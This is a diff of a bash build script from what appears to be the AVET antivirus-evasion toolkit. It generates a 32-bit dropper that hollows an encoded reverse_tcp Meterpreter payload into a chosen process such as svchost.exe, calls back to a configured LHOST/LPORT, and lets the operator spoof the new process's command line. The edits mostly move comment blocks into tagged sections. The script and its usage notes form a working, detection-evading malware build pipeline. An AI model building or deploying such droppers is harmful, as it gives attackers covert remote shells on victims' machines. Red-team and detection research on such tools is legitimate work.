@@ -1,28 +1,13 @@
 #!/bin/bash
+
+
+#DESCRIPTION_START
 # Hollowing 32-bit example build script
 # First creates an AVET payload
 # Secondly creates the executable that delivers the payload via hollowing
 # The reverse_tcp meterpreter payload is hollowed into a target process by the generated dropper executable output.exe
 # The target process to hollow into must be specified via the third(!) command line argument on dropper execution
-
-
-# Usage example of generated output.exe:
-#
-# hollowing_targetfromcmd_doubleenc_doubleev_revtcp_win32.exe first second C:\windows\system32\svchost.exe,C:\i\spoofed\this.exe
-#
-# The first and second command line parameters can be arbitrary strings, as they are not used. We just need the third command line parameter.
-# The format of the third parameter is expected to be as follows:	<process to hollow into>,<desired command line of new process>
-# So you need to specify two values, separated by a comma delimiter.
-#
-# <process to hollow into>:
-# Path to the executable image of your hollowing target. Based on this image, A NEW PROCESS WILL BE CREATED and your actual payload hollowed into it.
-#
-# <parent command line of new process>:
-# Specifies the command line of the newly created process. This will be passed internally as an argument for CreateProcess.
-# So you can basically spoof the command line of your hollowing target here.
-#
-# !!!
-# You are expected to keep the required format and specify all above mentioned parameters. Otherwise the program will probably crash (Who properly validates input anyway? The user always knows best ;)).
+#DESCRIPTION_END
 
 
 # print AVET logo
@@ -36,9 +21,15 @@ cat banner.txt
 # import global default lhost and lport values from build/global_connect_config.sh
 . build/global_connect_config.sh
 
+
+#CONFIGURATION_START
 # override connect-back settings here, if necessary
 LPORT=$GLOBAL_LPORT
 LHOST=$GLOBAL_LHOST
+# enable debug print into file because we probably can not easily reach stdout of the hollowed process
+enable_debug_print to_file C:/payload_log.txt
+#CONFIGURATION_END
+
 
 # import feature construction interface
 . build/feature_construction.sh
@@ -88,9 +79,6 @@ set_decoder xor
 
 # set shellcode binding technique
 set_payload_execution_method exec_shellcode
-
-# enable debug print into file because we probably can not easily reach stdout of the hollowed process
-enable_debug_print to_file C:/payload_log.txt
 
 # compile hollowing payload
 $win32_compiler -o input/hollowing_payload.exe source/avet.c -lws2_32
@@ -172,3 +160,24 @@ echo "
 #
 # !!!
 # You are expected to keep the required format and specify all above mentioned parameters. Otherwise the program will probably crash (Who properly validates input anyway? The user always knows best ;))."
+
+
+#USAGE_START
+# Usage example of generated output.exe:
+#
+# hollowing_targetfromcmd_doubleenc_doubleev_revtcp_win32.exe first second C:\windows\system32\svchost.exe,C:\i\spoofed\this.exe
+#
+# The first and second command line parameters can be arbitrary strings, as they are not used. We just need the third command line parameter.
+# The format of the third parameter is expected to be as follows:	<process to hollow into>,<desired command line of new process>
+# So you need to specify two values, separated by a comma delimiter.
+#
+# <process to hollow into>:
+# Path to the executable image of your hollowing target. Based on this image, A NEW PROCESS WILL BE CREATED and your actual payload hollowed into it.
+#
+# <parent command line of new process>:
+# Specifies the command line of the newly created process. This will be passed internally as an argument for CreateProcess.
+# So you can basically spoof the command line of your hollowing target here.
+#
+# !!!
+# You are expected to keep the required format and specify all above mentioned parameters. Otherwise the program will probably crash (Who properly validates input anyway? The user always knows best ;)).
+#USAGE_END
